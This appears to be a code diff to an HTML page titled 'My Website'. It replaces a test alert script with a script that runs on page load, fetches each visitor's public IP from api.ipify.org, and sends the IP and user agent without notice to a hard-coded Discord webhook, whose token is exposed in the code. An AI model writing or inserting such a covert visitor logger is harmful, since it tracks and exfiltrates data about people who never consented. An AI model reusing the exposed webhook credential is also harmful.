@@ -1,7 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>alert(1)</script>
+
+  <script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H";
+  const userAgent = navigator.userAgent;
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+
+      return fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: "New Visitor",
+              fields: [
+                { name: "IP Address", value: ip, inline: false },
+                { name: "User Agent", value: userAgent, inline: false }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        })
+      });
+    });
+</script>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>My Website</title>
